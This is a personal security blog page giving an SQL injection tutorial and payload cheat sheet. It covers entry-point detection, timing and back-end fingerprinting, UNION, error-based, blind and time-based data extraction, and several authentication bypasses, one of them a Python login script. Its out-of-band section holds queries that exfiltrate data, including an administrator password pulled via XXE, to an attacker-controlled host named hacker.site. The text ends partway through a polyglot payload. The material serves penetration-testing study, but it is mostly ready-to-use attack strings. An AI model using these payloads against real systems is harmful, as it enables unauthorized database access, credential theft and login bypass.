<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> SQL Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/sql-injection/2025-01-01-sql-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">SQL Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="sql-injection">SQL Injection</h1> <h2 id="what-is-sql-injection">What is SQL injection?</h2> <p>An <strong>SQL injection</strong> is a security flaw that allows attackers to <strong>interfere with database queries</strong> of an application. This vulnerability can enable attackers to <strong>view</strong>, <strong>modify</strong>, or <strong>delete</strong> data they shouldn’t access, including information of other users or any data the application can access. Such actions may result in permanent changes to the application’s functionality or content or even compromision of the server or denial of service.</p> <h2 id="entry-point-detection">Entry point detection</h2> <p>When a site appears to be <strong>vulnerable to SQL injection (SQLi)</strong> due to unusual server responses to SQLi-related inputs, the <strong>first step</strong> is to understand how to <strong>inject data into the query without disrupting it</strong>. This requires identifying the method to <strong>escape from the current context</strong> effectively. These are some useful examples:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> [Nothing]
'
"
`
')
")
`)
'))
"))
`))
</code></pre></div></div> <p>Then, you need to know how to <strong>fix the query so there isn’t errors</strong>. In order to fix the query you can <strong>input</strong> data so the <strong>previous query accept the new data</strong>, or you can just <strong>input</strong> your data and <strong>add a comment symbol add the end</strong>.</p> <p><em>Note that if you can see error messages or you can spot differences when a query is working and when it’s not this phase will be more easy.</em></p> <h3 id="comments"><strong>Comments</strong></h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MySQL</span>
<span class="o">#</span><span class="k">comment</span>
<span class="c1">-- comment     [Note the space after the double dash]</span>
<span class="cm">/*comment*/</span>
<span class="cm">/*! MYSQL Special SQL */</span>

<span class="n">PostgreSQL</span>
<span class="c1">--comment</span>
<span class="cm">/*comment*/</span>

<span class="n">MSQL</span>
<span class="c1">--comment</span>
<span class="cm">/*comment*/</span>

<span class="n">Oracle</span>
<span class="c1">--comment</span>

<span class="n">SQLite</span>
<span class="c1">--comment</span>
<span class="cm">/*comment*/</span>

<span class="n">HQL</span>
<span class="n">HQL</span> <span class="n">does</span> <span class="k">not</span> <span class="n">support</span> <span class="n">comments</span>
</code></pre></div></div> <h3 id="confirming-with-logical-operations">Confirming with logical operations</h3> <p>A reliable method to confirm an SQL injection vulnerability involves executing a <strong>logical operation</strong> and observing the expected outcomes. For instance, a GET parameter such as <code class="language-plaintext highlighter-rouge">?username=Peter</code> yielding identical content when modified to <code class="language-plaintext highlighter-rouge">?username=Peter' or '1'='1</code> indicates a SQL injection vulnerability.</p> <p>Similarly, the application of <strong>mathematical operations</strong> serves as an effective confirmation technique. For example, if accessing <code class="language-plaintext highlighter-rouge">?id=1</code> and <code class="language-plaintext highlighter-rouge">?id=2-1</code> produce the same result, it’s indicative of SQL injection.</p> <p>Examples demonstrating logical operation confirmation:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
</code></pre></div></div> <p>This word-list was created to try to <strong>confirm SQLinjections</strong> in the proposed way:</p> <p>sqli-logic.txt</p> <h3 id="confirming-with-timing">Confirming with Timing</h3> <p>In some cases you <strong>won’t notice any change</strong> on the page you are testing. Therefore, a good way to <strong>discover blind SQL injections</strong> is making the DB perform actions and will have an <strong>impact on the time</strong> the page need to load.<br> Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' &amp;&amp; sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
</code></pre></div></div> <p>In some cases the <strong>sleep functions won’t be allowed</strong>. Then, instead of using those functions you could make the query <strong>perform complex operations</strong> that will take several seconds. <em>Examples of these techniques are going to be commented separately on each technology (if any)</em>.</p> <h3 id="identifying-back-end">Identifying Back-end</h3> <p>The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the <em><strong>sleep</strong></em> <strong>functions</strong> of the previous section or these ones (table from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification" rel="external nofollow noopener" target="_blank">payloadsallthethings</a>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="s2">"conv('a',16,2)=conv('a',16,2)"</span>                   ,<span class="s2">"MYSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"connection_id()=connection_id()"</span>                 ,<span class="s2">"MYSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"crc32('MySQL')=crc32('MySQL')"</span>                   ,<span class="s2">"MYSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"</span>       ,<span class="s2">"MSSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"@@CONNECTIONS&gt;0"</span>                                 ,<span class="s2">"MSSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"@@CONNECTIONS=@@CONNECTIONS"</span>                     ,<span class="s2">"MSSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"@@CPU_BUSY=@@CPU_BUSY"</span>                           ,<span class="s2">"MSSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"USER_ID(1)=USER_ID(1)"</span>                           ,<span class="s2">"MSSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"ROWNUM=ROWNUM"</span>                                   ,<span class="s2">"ORACLE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"RAWTOHEX('AB')=RAWTOHEX('AB')"</span>                   ,<span class="s2">"ORACLE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"LNNVL(0=123)"</span>                                    ,<span class="s2">"ORACLE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"5::int=5"</span>                                        ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"5::integer=5"</span>                                    ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"pg_client_encoding()=pg_client_encoding()"</span>       ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"get_current_ts_config()=get_current_ts_config()"</span> ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"quote_literal(42.5)=quote_literal(42.5)"</span>         ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"current_database()=current_database()"</span>           ,<span class="s2">"POSTGRESQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"sqlite_version()=sqlite_version()"</span>               ,<span class="s2">"SQLITE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"last_insert_rowid()&gt;1"</span>                           ,<span class="s2">"SQLITE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"last_insert_rowid()=last_insert_rowid()"</span>         ,<span class="s2">"SQLITE"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"val(cvar(1))=1"</span>                                  ,<span class="s2">"MSACCESS"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0"</span>               ,<span class="s2">"MSACCESS"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"cdbl(1)=cdbl(1)"</span>                                 ,<span class="s2">"MSACCESS"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"1337=1337"</span>,   <span class="s2">"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"</span><span class="o">]</span>,
<span class="o">[</span><span class="s2">"'i'='i'"</span>,     <span class="s2">"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"</span><span class="o">]</span>,
</code></pre></div></div> <p>Also, if you have access to the output of the query, you could make it <strong>print the version of the database</strong>.</p> <blockquote> <p>[!NOTE] A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.</p> </blockquote> <h3 id="identifying-with-portswigger">Identifying with PortSwigger</h3> <p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p> <h2 id="exploiting-union-based">Exploiting Union Based</h2> <h3 id="detecting-number-of-columns">Detecting number of columns</h3> <p>If you can see the output of the query this is the best way to exploit it.<br> First of all, wee need to find out the <strong>number</strong> of <strong>columns</strong> the <strong>initial request</strong> is returning. This is because <strong>both queries must return the same number of columns</strong>.<br> Two methods are typically used for this purpose:</p> <h4 id="ordergroup-by">Order/Group by</h4> <p>To determine the number of columns in a query, incrementally adjust the number used in <strong>ORDER BY</strong> or <strong>GROUP BY</strong> clauses until a false response is received. Despite the distinct functionalities of <strong>GROUP BY</strong> and <strong>ORDER BY</strong> within SQL, both can be utilized identically for ascertaining the query’s column count.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' ORDER BY 1--+    #True
1'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">2</span><span class="c1">--+    #True</span>
<span class="mi">1</span><span class="s1">' ORDER BY 3--+    #True
1'</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">4</span><span class="c1">--+    #False - Query is only using 3 columns</span>
                        <span class="o">#-</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,3--+    True
</span></code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' GROUP BY 1--+    #True
1'</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="mi">2</span><span class="c1">--+    #True</span>
<span class="mi">1</span><span class="s1">' GROUP BY 3--+    #True
1'</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="mi">4</span><span class="c1">--+    #False - Query is only using 3 columns</span>
                        <span class="o">#-</span><span class="mi">1</span><span class="s1">' UNION SELECT 1,2,3--+    True
</span></code></pre></div></div> <h4 id="union-select">UNION SELECT</h4> <p>Select more and more null values until the query is correct:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">' UNION SELECT null-- - Not working
1'</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">-- - Not working</span>
<span class="mi">1</span><span class="s1">' UNION SELECT null,null,null-- - Worked
</span></code></pre></div></div> <p><em>You should use <code class="language-plaintext highlighter-rouge">null</code>values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.</em></p> <h3 id="extract-database-names-table-names-and-column-names">Extract database names, table names and column names</h3> <p>On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="k">Database</span> <span class="k">names</span>
<span class="o">-</span><span class="mi">1</span><span class="s1">' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1'</span> <span class="k">UniOn</span> <span class="k">Select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">gRoUp_cOncaT</span><span class="p">(</span><span class="mi">0</span><span class="n">x7c</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7C</span><span class="p">)</span> <span class="k">fRoM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">wHeRe</span> <span class="n">table_schema</span><span class="o">=</span><span class="p">[</span><span class="k">database</span><span class="p">]</span>

<span class="o">#</span><span class="k">Column</span> <span class="k">names</span>
<span class="o">-</span><span class="mi">1</span><span class="s1">' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
</span></code></pre></div></div> <p><em>There is a different way to discover this data on every different database, but it’s always the same methodology.</em></p> <h2 id="exploiting-hidden-union-based">Exploiting Hidden Union Based</h2> <p>When the output of a query is visible, but a union-based injection seems unachievable, it signifies the presence of a <strong>hidden union-based injection</strong>. This scenario often leads to a blind injection situation. To transform a blind injection into a union-based one, the execution query on the backend needs to be discerned.</p> <p>This can be accomplished through the use of blind injection techniques alongside the default tables specific to your target Database Management System (DBMS). For understanding these default tables, consulting the documentation of the target DBMS is advised.</p> <p>Once the query has been extracted, it’s necessary to tailor your payload to safely close the original query. Subsequently, a union query is appended to your payload, facilitating the exploitation of the newly accessible union-based injection.</p> <p>For more comprehensive insights, refer to the complete article available at <a href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f" rel="external nofollow noopener" target="_blank">Healing Blind Injections</a>.</p> <h2 id="exploiting-error-based">Exploiting Error based</h2> <p>If for some reason you <strong>cannot</strong> see the <strong>output</strong> of the <strong>query</strong> but you can <strong>see the error messages</strong>, you can make this error messages to <strong>ex-filtrate</strong> data from the database.<br> Following a similar flow as in the Union Based exploitation you could manage to dump the DB.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">and</span> <span class="k">row</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="n">CONCAT</span><span class="p">(</span><span class="o">@@</span><span class="k">VERSION</span><span class="p">),</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">a</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">))</span>
</code></pre></div></div> <h2 id="exploiting-blind-sqli">Exploiting Blind SQLi</h2> <p>In this case you cannot see the results of the query or the errors, but you can <strong>distinguished</strong> when the query <strong>return</strong> a <strong>true</strong> or a <strong>false</strong> response because there are different contents on the page.<br> In this case, you can abuse that behaviour to dump the database char by char:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="k">SELECT</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="o">=</span> <span class="s1">'A'</span>
</code></pre></div></div> <h2 id="exploiting-error-blind-sqli">Exploiting Error Blind SQLi</h2> <p>This is the <strong>same case as before</strong> but instead of distinguish between a true/false response from the query you can <strong>distinguish between</strong> an <strong>error</strong> in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">IF</span><span class="p">(</span><span class="mi">1</span><span class="p">,(</span><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">),</span><span class="s1">'a'</span><span class="p">))</span><span class="c1">-- -</span>
</code></pre></div></div> <h2 id="exploiting-time-based-sqli">Exploiting Time Based SQLi</h2> <p>In this case there <strong>isn’t</strong> any way to <strong>distinguish</strong> the <strong>response</strong> of the query based on the context of the page. But, you can make the page <strong>take longer to load</strong> if the guessed character is correct. We have already saw this technique in use before in order to <a href="#confirming-with-timing">confirm a SQLi vuln</a>.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">)</span><span class="o">#</span>
</code></pre></div></div> <h2 id="stacked-queries">Stacked Queries</h2> <p>You can use stacked queries to <strong>execute multiple queries in succession</strong>. Note that while the subsequent queries are executed, the <strong>results</strong> are <strong>not returned to the application</strong>. Hence this technique is primarily of use in relation to <strong>blind vulnerabilities</strong> where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p> <p><strong>Oracle</strong> doesn’t support <strong>stacked queries.</strong> <strong>MySQL, Microsoft</strong> and <strong>PostgreSQL</strong> support them: <code class="language-plaintext highlighter-rouge">QUERY-1-HERE; QUERY-2-HERE</code></p> <h2 id="out-of-band-exploitation">Out of band Exploitation</h2> <p>If <strong>no-other</strong> exploitation method <strong>worked</strong>, you may try to make the <strong>database ex-filtrate</strong> the info to an <strong>external host</strong> controlled by you. For example, via DNS queries:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="s1">'</span><span class="se">\\\\</span><span class="s1">'</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="s1">'.hacker.site</span><span class="se">\\</span><span class="s1">a.txt'</span><span class="p">));</span>
</code></pre></div></div> <h3 id="out-of-band-data-exfiltration-via-xxe">Out of band data exfiltration via XXE</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="s1">' UNION SELECT EXTRACTVALUE(xmltype('</span><span class="o">&lt;?</span><span class="n">xml</span> <span class="k">version</span><span class="o">=</span><span class="nv">"1.0"</span> <span class="k">encoding</span><span class="o">=</span><span class="nv">"UTF-8"</span><span class="o">?&gt;&lt;!</span><span class="n">DOCTYPE</span> <span class="n">root</span> <span class="p">[</span> <span class="o">&lt;!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">remote</span> <span class="k">SYSTEM</span> <span class="nv">"http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"</span><span class="o">&gt;</span> <span class="o">%</span><span class="n">remote</span><span class="p">;]</span><span class="o">&gt;</span><span class="s1">'),'</span><span class="o">/</span><span class="n">l</span><span class="s1">') FROM dual-- -
</span></code></pre></div></div> <h2 id="automated-exploitation">Automated Exploitation</h2> <p>Check the <a href="sqlmap/index.html">SQLMap Cheatsheet</a> to exploit a SQLi vulnerability with <a href="https://github.com/sqlmapproject/sqlmap" rel="external nofollow noopener" target="_blank"><strong>sqlmap</strong></a>.</p> <h2 id="tech-specific-info">Tech specific info</h2> <p>We have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:</p> <ul> <li><a href="ms-access-sql-injection.md">MS Access</a></li> <li><a href="mssql-injection.md">MSSQL</a></li> <li><a href="mysql-injection/index.html">MySQL</a></li> <li><a href="oracle-injection.md">Oracle</a></li> <li><a href="postgresql-injection/index.html">PostgreSQL</a></li> </ul> <p>Or you will find <strong>a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" rel="external nofollow noopener" target="_blank"><strong>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</strong></a></p> <h2 id="authentication-bypass">Authentication bypass</h2> <p>List to try to bypass the login functionality:</p> <p>../login-bypass/sql-login-bypass.md</p> <h3 id="raw-hash-authentication-bypass">Raw hash authentication Bypass</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">"SELECT * FROM admin WHERE pass = '"</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="err">$</span><span class="n">password</span><span class="p">,</span><span class="k">true</span><span class="p">).</span><span class="nv">"'"</span>
</code></pre></div></div> <p>This query showcases a vulnerability when MD5 is used with true for raw output in authentication checks, making the system susceptible to SQL injection. Attackers can exploit this by crafting inputs that, when hashed, produce unexpected SQL command parts, leading to unauthorized access.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">md5</span><span class="p">(</span><span class="nv">"ffifdyop"</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'or'</span><span class="mi">6</span><span class="err">�</span><span class="p">]</span><span class="err">��</span><span class="o">!</span><span class="n">r</span><span class="p">,</span><span class="err">��</span><span class="n">b</span><span class="err">�</span>
<span class="n">sha1</span><span class="p">(</span><span class="nv">"3fDf "</span><span class="p">,</span> <span class="k">true</span><span class="p">)</span> <span class="o">=</span> <span class="n">Q</span><span class="err">�</span><span class="n">u</span><span class="s1">'='</span><span class="err">�</span><span class="o">@</span><span class="err">�</span><span class="p">[</span><span class="err">�</span><span class="n">t</span><span class="err">�</span><span class="o">-</span> <span class="n">o</span><span class="err">��</span><span class="n">_</span><span class="o">-!</span>
</code></pre></div></div> <h3 id="injected-hash-authentication-bypass">Injected hash authentication Bypass</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">admin</span><span class="s1">' AND 1=0 UNION ALL SELECT '</span><span class="k">admin</span><span class="s1">', '</span><span class="mi">81</span><span class="n">dc9bdb52d04dc20036dbd8313ed055</span><span class="s1">'
</span></code></pre></div></div> <p><strong>Recommended list</strong>:</p> <p>You should use as username each line of the list and as password always: <em><strong>Pass1234.</strong></em><br> <em>(This payloads are also included in the big list mentioned at the beginning of this section)</em></p> <p>sqli-hashbypass.txt</p> <h3 id="gbk-authentication-bypass">GBK Authentication Bypass</h3> <p>IF ‘ is being scaped you can use %A8%27, and when ‘ gets scaped it will be created: 0xA80x5c0x27 (<em>╘’</em>)</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="mi">27</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">-- 2</span>
<span class="o">%</span><span class="mi">8</span><span class="k">C</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="mi">27</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- 2</span>
<span class="o">%</span><span class="n">bf</span><span class="s1">' or 1=1 -- --
</span></code></pre></div></div> <p>Python script:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://example.com/index.php</span><span class="sh">"</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="n">PHPSESSID</span><span class="o">=</span><span class="sh">'</span><span class="s">4j37giooed20ibi12f3dqjfbkp3</span><span class="sh">'</span><span class="p">)</span>
<span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">:</span> <span class="nf">chr</span><span class="p">(</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="mh">0x27</span><span class="p">)</span> <span class="o">+</span> <span class="sh">"</span><span class="s">OR 1=1 #</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">datas</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">referrer</span><span class="sh">'</span><span class="p">:</span><span class="n">url</span><span class="p">})</span>
<span class="k">print</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
</code></pre></div></div> <h3 id="polyglot-injection-multicontext">Polyglot injection (multicontext)</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SLEEP</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="cm">/*' or SLEEP(1) or '" or SLEEP(1) or "*/</span>
